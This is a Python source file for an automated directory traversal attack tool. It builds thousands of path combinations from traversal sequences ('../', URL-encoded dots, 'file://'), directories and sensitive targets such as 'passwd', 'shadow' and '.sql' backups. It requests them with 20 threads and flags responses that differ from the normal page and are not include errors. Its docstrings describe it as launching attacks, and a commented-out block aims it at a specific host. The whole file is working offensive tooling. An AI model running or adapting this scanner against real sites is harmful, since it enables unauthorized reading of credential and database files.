import requests
import concurrent.futures
from itertools import repeat

# Path searched counter
a = 0

stuff = [
    "",
    "backup/",
    "services/",
    "database/",
    "db/",
    "backup-db/",
    "etc/",
    "var/",
    "var/log/",
    "var/www/files/",
]

dots = [
    "",
    "../",
    "../../",
    "../../../",
    "etc/",
    "%2e%2e%2f",
]

files = [
    "",
    "?file=",
    "get-files",
    "get-files?",
    "file:",
    "get-files?file=",
    "file:",
    "file:/",
    "file://",
    "f?",
]

words = [
    "",
    "services",
    "functions",
    "default",
    "backup",
    "users",
    "connect",
    "shadow",
    "security",
    "passwd",
    "group",
    "index",
    "admin",
    "login",
    "home",
    "dashboard",
    "delete",
    "update",
    "remove",
    "access",
    "apache",
    "apache2",
]

suffix = [
    "",
    ".sql",
    ".php",
    ".txt",
]


def count_searched(zero=False):
    """
    Function counts searched paths
    :return: Number of searched paths
    """
    global a
    if zero:
        a = 0
    else:
        a += 1
    return a


def false_positives(path_end, current_content):
    """
    Function checks if found content includes warning messages
    :param path_end: End part of file path
    :param current_content: Content found in path
    :return: False if content doesn't include warnings
    """
    warning_message = False
    too_long = False
    warning1 = "Warning: include(" + path_end + "): failed to open stream: No such file or directory in"
    warning2 = "Warning: include(): Failed opening \'" + path_end + "\' for inclusion"
    warning3 = "Warning: include("
    warning4 = "): failed to open stream: No such file or directory in"
    warning5 = "Warning: include(): Failed opening \'"
    warning6 = "failed to open stream:"
    # Too long content is usually an error message
    if len(current_content) > 2000000:
        too_long = True
    if warning1 in current_content or warning2 in current_content:
        warning_message = True
    elif warning3 in current_content or warning6 in current_content:
        warning_message = True
    elif warning4 in current_content or warning5 in current_content:
        warning_message = True
    if not warning_message and not too_long:
        return False
    else:
        return True


def not_normal(current_content, normal_content):
    """
    Function compares contents
    :param current_content: Content found in a path
    :param normal_content: Content usually found on a website
    :return: True if contents differ
    """
    if current_content != normal_content:
        return True
    else:
        return False


def try_path(target_url, path, path_end):
    """
    Function requests specific path and puts the content through various test to see if the exploit was successful
    :param target_url: Target url
    :param path: Tested path
    :param path_end: End of path
    :return: True if path was successful or false
    """
    successful = False
    full_path = target_url + path
    try:
        request = requests.get(full_path)
        normal_content = normal_con(target_url)
        if request.status_code == 200:
            # Isn't normal website content
            if not_normal(request.text, normal_content):
                # Isn't error message
                if not false_positives(path_end, request.text):
                    successful = True
                    request.close()
    except requests.ConnectionError as e:
        pass
    except ValueError as el:
        pass
    return successful


def scan_for_file(target_url, file_name):
    """
    Function generates paths for file to test all combinations from a lists
    :param target_url: Target url
    :param file_name: File for which paths will be generated
    :return: List with successful paths
    """
    successful_path_list = []
    for file in files:
        for dot in dots:
            for stu in stuff:
                count_searched()
                current_path = file + dot + stu + file_name
                current_end = dot + stu + file_name
                result = try_path(target_url, current_path, current_end)
                if result:
                    successful_path_list.append(target_url + current_path)
    return successful_path_list


def normal_con(target_url):
    """
    Function gets website content
    :param target_url: Target url
    :return: Usual website content
    """
    content = requests.get(target_url)
    return content.text


def threading(target_url):
    """
    Function threads and starts attack on each file name (from list "word")
    :param target_url: Target url
    :return: List with successful paths
    """
    # Start threading with elements from list words
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        # each file name (without suffix) is a thread
        result = executor.map(add_suffix, repeat(target_url), words)
    # Adjust the result (tuple with lists as elements)
    tuple_of_lists = tuple(result)
    list_of_lists = list(tuple_of_lists)
    final_list = []
    # Iterate over all elements in lists in a list
    for lis in list_of_lists:
        for item in lis:
            final_list.append(item)
    # Final list with found paths
    return final_list


def add_suffix(target_url, thread_file):
    """
    Function adds suffixes (form "suffix") to parameter
    :param target_url: Target url
    :param thread_file: File name without suffix
    :return: List with successful paths
    """
    successful = []
    for suf in suffix:
        file = thread_file + suf
        i = scan_for_file(target_url, file)
        successful.extend(i)
    return successful


def scan(target_url, custom_code=False):
    """
    Function performs Directory traversal attack
    :param custom_code: Custom file (e.g. text.py)
    :param target_url: Target url
    :return: Attack success
    """
    response = {'target_url': target_url}
    if custom_code is not False:
        response['attack_type'] = 'custom attack'
        successful = scan_for_file(target_url, custom_code)
    else:
        response['attack_type'] = 'full scan'
        successful = threading(target_url)
    response['tried'] = str(count_searched())

    if len(successful) > 0:
        response['status'] = True
        response['found'] = str(len(successful))
        response['found_path'] = successful
    else:
        response['found'] = 0
        response['status'] = False
    return response


def launch(target_url, attack_type, custom_code):
    """
    Function launch Directory (Path) traversal with provided parameters
    :param target_url: Target url
    :param attack_type: Type of Path traversal
    :param custom_code: Custom file name (connect.py) (OPTIONAL)
    :return: Attack success
    """
    response = {}
    count_searched(True)
    # Check if last character is '/'
    if target_url[-1] != '/':
        target_url = target_url + '/'
    try:
        r = requests.get(target_url)
        if attack_type == 'full_scan':
            response = scan(target_url)
        elif attack_type == 'custom':
            response = scan(target_url, custom_code)
        else:
            response = {'error': True, 'description': 'Invalid attack type'}
    except requests.exceptions.ConnectionError:
        response = {'error': True, 'description': 'Host not responding'}
    except requests.exceptions.MissingSchema:
        response = {'error': True, 'description': 'Invalid URL'}
    finally:
        return response


"""
if __name__ == '__main__':
    target_url = 'http://apache1.willilazarov.cz/'
    print(scan(target_url, "users.sql"))
"""
